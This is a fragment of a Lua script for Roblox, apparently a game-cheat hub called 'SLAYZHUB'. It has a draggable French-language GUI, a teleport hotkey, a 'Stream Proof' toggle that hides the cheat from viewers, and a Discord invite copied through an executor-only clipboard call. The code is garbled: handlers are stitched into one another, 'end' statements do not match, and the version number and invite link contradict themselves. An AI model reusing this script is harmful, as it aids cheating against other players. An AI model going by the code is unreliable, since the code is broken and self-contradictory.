-- Système de déplacement
local dragging = false
local dragStart = nil
local startPos = nil

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
    
    lbl(keyTab, "Raccourcis:", CONFIG.THEME.Accent)
    lbl(keyTab, "[T] - Téléporter", CONFIG.THEME.TextDark)
    lbl(keyTab, "[INSERT] - Ouvrir/Fermer", CONFIG.THEME.TextDark)
    lbl(keyTab, "[P] - Stream Proof", CONFIG.THEME.TextDark)
    
    lbl(infoTab, "Discord:", CONFIG.THEME.Accent)
    local discord = Instance.new("TextButton", infoTab)
    discord.Size = UDim2.new(1, 0, 0, 40)
    discord.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
    discord.Text = "https://discord.gg/dHTTTh8S"
    discord.TextColor3 = Color3.fromRGB(255, 255, 255)
    discord.Font = Enum.Font.GothamBold
    discord.TextSize = 14
    Instance.new("UICorner", discord).CornerRadius = UDim.new(0, 8)
    discord.MouseButton1Click:Connect(function() setclipboard("https://discord.gg/invite") end)
    lbl(infoTab, "Version: 1.0.0", CONFIG.THEME.TextDim)
    lbl(infoTab, "Créé par Slayz", CONFIG.THEME.TextDim)
end
end)

createGUI()

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.T then
        teleportSequence()
    elseif input.KeyCode == Enum.KeyCode.Insert then
        local main = PlayerGui:FindFirstChild("MinimalTP_GUI"):FindFirstChild("MainFrame")
        local reopen = PlayerGui:FindFirstChild("MinimalTP_GUI"):FindFirstChild("ReopenButton")
        if main and reopen then
            State.guiVisible = not State.guiVisible
            main.Visible = State.guiVisible
            reopen.Visible = not State.guiVisible
        end
    elseif input.KeyCode == Enum.KeyCode.P then
        local gui = PlayerGui:FindFirstChild("MinimalTP_GUI")
        if gui then gui.Enabled = not gui.Enabled end
TitleBar.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, 
            startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- Animation d'entrée
MainFrame.Size = UDim2.new(0, 0, 0, 0)
MainFrame.BackgroundTransparency = 1

wait(0.1)

TweenService:Create(MainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 580, 0, 480),
    BackgroundTransparency = 0.05
}):Play()

print("🔥 SLAYZHUB v4.2 MODERNE CHARGÉ!")
